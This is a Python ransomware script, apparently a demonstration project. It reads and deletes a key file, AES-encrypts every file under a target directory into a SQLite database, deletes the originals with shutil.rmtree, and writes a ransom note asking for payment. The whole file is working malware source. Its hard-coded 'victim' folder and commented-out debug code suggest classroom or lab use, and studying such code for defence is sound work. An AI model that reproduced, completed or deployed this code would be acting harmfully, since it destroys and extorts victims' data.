import os
import shutil
import sys
import base64
import dataset
from Crypto.Cipher import AES
from Crypto import Random

""" This script runs on the victim's machine. It retrieves a symmetric key
from a 'key.txt' file and deletes the file. Then it encrypts, stores,
and deletes every file in the root directory.

Uses a random IV for each file to prevent patterns from being identified 
in encrypted files.

No Message Authentication Code is necesssary because we are not concerned 
with authenticity. We don't anticipate anyone to be changing this data.
"""

def encrypt(message):
    """Encrypt message using the key and randomly generated IV."""
    iv = Random.new().read(AES.block_size) # New IV for each file
    cipher = AES.new(key, AES.MODE_CFB, iv)
    encrypted = cipher.encrypt(message)
    return iv, encrypted

def decrypt(iv, message):
    """Decrypt message using the key and IV"""
    cipher = AES.new(key, AES.MODE_CFB, iv)
    return cipher.decrypt(message) # Decrypt


def store_file(iv, data, file_path):
    """Store each file with it's filename and encoded IV and data.

    The IV and data must be encoded in order to store them in the SQL database.
    """
    encoded_iv = base64.encodestring(iv)
    encoded_data = base64.encodestring(data)

    return table.insert(dict(iv=encoded_iv, 
                            data=encoded_data,
                            path=file_path))

# Would normally remove, but leaving here for demonstration purposes
# def print_file(path):
#     """Print a stored file to the console for debugging/demonstration"""
#     f = table.find_one(path=path)
#
#     decoded_iv = base64.decodestring(f['iv'])
#     decoded_data = base64.decodestring(f['data'])
#
#     final_message = decrypt(decoded_iv, decoded_data)
#
#     print f['path'].strip()
#     if(final_message != ""):
#         print '  ' + final_message.strip()
#
# def print_files():
#     """Print all stored files to the console for debugging/demonstration."""
#     for f in db['files']:
#         print_file(f['path'])

def get_and_delete_key(key_file):
    """Retrieves the symmetric key from a file and then deletes the file."""
    try:
        with open(key_file, 'r') as f:
            key_num, key = f.read().split('\n')
        os.remove(key_file)
    except IOError, OSError:
        # If we forget to add a 'key.txt' file, don't encrypt the victim's files.
        # We are nice hackers :-)
        print "Sorry! I couldn't find a key, so I couldn't encrypt your files."
        sys.exit()
    return key_num, key

def leave_ransom_note(note_file):
    """Leaves a ransom note behind with instructions on how to make a
    payment and recover files.
    """
    ransom_text = """Your files have been taken ransom. Pay $$$ to xxxx and email xxxxx@xxx.com to recover them"""
    with open(note_file, 'w') as f:
        f.write(ransom_text)

def attack(root):
    """Launches the attack on the victim's files."""

    # Walk root directory to encrypt, store, and delete everything
    # Need to walk bottom up in order to delele directories as we go
    for dirpath, dirs, files in os.walk(root, topdown=False):
        for f in files:
            # Store root directory in every path so we can restore the name
            full_path = os.path.join(dirpath, f)
            relative_path = os.path.relpath(full_path, root)
            path = os.path.join(root, relative_path)
            with open(full_path, "r") as f:
                data = f.read() # Will crash if file is too large!
                iv, encrypted_data = encrypt(data)
            store_file(iv, encrypted_data, path)
        shutil.rmtree(dirpath)
    leave_ransom_note("RANSOM.txt")

# Setup database
db = dataset.connect('sqlite:///files.db')
table = db['files']
ivs = db['num']
root = 'victim'

# Get key from file and delete file
key_num, key = get_and_delete_key('key.txt')

# Start the attack
attack(root)
